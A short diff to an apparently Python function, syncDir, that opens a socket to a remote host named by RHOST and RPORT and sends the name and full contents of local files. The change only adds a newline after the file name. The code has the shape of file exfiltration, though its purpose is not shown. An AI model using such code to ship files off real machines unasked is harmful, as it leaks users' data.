@@ -40,7 +40,7 @@ def syncDir():
             continue
         sock0.connect((RHOST, RPORT))
         with open(file, 'r') as target:
-            sendBuffer = file
+            sendBuffer = file + '\n'
             for line in target:
                 sendBuffer += line
             sock0.send(sendBuffer.encode('utf-8'))
